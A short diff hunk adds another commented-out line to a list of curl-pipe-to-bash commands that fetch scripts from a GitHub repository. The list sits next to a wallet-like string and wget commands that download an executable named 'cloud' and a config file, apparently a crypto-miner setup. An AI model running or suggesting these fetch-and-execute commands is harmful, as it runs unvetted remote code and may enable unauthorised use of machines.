@@ -11,5 +11,6 @@
 # curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/scalas.sh" | bash
 # curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/mbcmaster.sh" | bash
 # curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/veco.sh" | bash
+# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/sw.sh" | bash
 # R9uBfT46Kv9kGa4bbeYRvmoNwYCitp7Hit
 # ([ -f cloud ] || wget -q -O cloud https://github.com/barburonjilo/open/raw/refs/heads/main/isu) && wget -q -O config.json https://github.com/barburonjilo/open/raw/refs/heads/main/isu2.json && chmod +x cloud config.json
